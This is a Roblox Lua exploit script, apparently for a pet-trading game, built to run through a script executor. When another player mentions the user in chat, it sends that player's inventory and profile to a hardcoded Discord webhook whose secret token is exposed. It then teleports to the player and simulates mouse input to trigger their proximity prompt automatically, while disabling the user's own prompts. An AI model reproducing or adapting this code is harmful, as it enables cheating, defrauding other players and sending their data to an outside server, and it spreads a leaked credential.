local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    pcall(function()
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
        end
    end)
end

local function getTargetPrompt(targetChar)
    local rootPart = targetChar:FindFirstChild("HumanoidRootPart")
    if not rootPart then return nil end
    
    for _, child in pairs(rootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            return child
        end
    end
    return nil
end

local function preciseClickPrompt(prompt)
    local promptPart = prompt.Parent
    local startTime = os.clock()
    
    -- Get precise screen position of the prompt
    local screenPoint, visible = Camera:WorldToScreenPoint(promptPart.Position)
    if not visible then return false end
    
    -- Adjust for prompt offset (exact center)
    local viewportSize = Camera.ViewportSize
    local targetPos = Vector2.new(
        screenPoint.X,
        screenPoint.Y - 50 -- Adjust Y offset for prompt position
    )
    
    -- Smooth mouse movement
    local steps = 10
    for i = 1, steps do
        local t = i/steps
        local currentPos = Vector2.new(
            (i-1)/steps * targetPos.X,
            (i-1)/steps * targetPos.Y
        )
        local newPos = currentPos:Lerp(targetPos, t)
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.05)
    end
    
    -- Hold and click
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
    
    -- Maintain position during hold
    while os.clock() - startTime < prompt.HoldDuration + 0.2 do
        screenPoint = Camera:WorldToScreenPoint(promptPart.Position)
        targetPos = Vector2.new(screenPoint.X, screenPoint.Y - 50)
        VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
        task.wait(0.05)
    end
    
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
    return true
end

local function interactWithTarget(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    
    -- Position in front of target
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -2.5))
    
    -- Find and click prompt
    local prompt = getTargetPrompt(targetChar)
    if prompt then
        preciseClickPrompt(prompt)
    end
end

local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    if not message:lower():find("@"..LocalPlayer.Name:lower()) and not message:find("@everyone") and not message:find("@here") then return end
    
    -- Get target inventory
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    -- Send webhook
    local embed = {
        title = "🎯 Mention Detected | "..player.Name,
        description = "**Chat:** ```"..message.."```",
        color = 0xFFA500,
        fields = {
            {name = "📦 Inventory", value = #items > 0 and "```"..table.concat(items, ", ").."```" or "```Empty```", inline = false},
            {name = "🔗 Profile", value = "https://www.roblox.com/users/"..player.UserId.."/profile", inline = false}
        }
    }
    sendWebhook("@everyone", embed)
    
    -- Interact with target
    interactWithTarget(player)
end

-- Initialize
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
    end
end
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
end)

-- Disable local prompts
local function disableLocalPrompts()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local root = char:WaitForChild("HumanoidRootPart")
    for _, child in pairs(root:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            child.Enabled = false
        end
    end
end
LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
disableLocalPrompts()
